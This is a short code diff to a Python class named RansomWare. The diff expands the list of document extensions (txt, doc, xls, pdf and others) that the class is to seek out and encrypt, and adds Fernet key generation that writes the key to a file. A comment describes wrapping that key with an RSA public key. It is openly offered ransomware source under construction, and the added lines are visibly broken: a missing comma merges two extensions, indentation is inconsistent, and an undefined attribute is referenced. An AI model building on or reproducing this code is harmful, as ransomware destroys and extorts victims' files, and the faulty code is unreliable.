@@ -14,7 +14,7 @@ class RansomWare:
     
     # File exstensions to seek out and Encrypt
     file_exts = [
-        'txt',
+        '.txt', '.log', '.csv', '.doc', '.docx' '.xls', '.pdf', '.xlsx', '.ppt'
         
 
     ]
@@ -22,7 +22,13 @@ class RansomWare:
 
     def __init__(self):
         # Key that will be used for Fernet object and encrypt/decrypt method
-        
+        key_file_name = "secret.key"
+
+        self.key = Fernet.generate_key()
+            with open(self.key_file_name, "wb") as key_file:
+             key_file.write(self.key)
+        self.fernet = Fernet(self.key)
+             
         # Encrypt/Decrypter
         
         # RSA public key used for encrypting/decrypting fernet object eg, Symmetric key
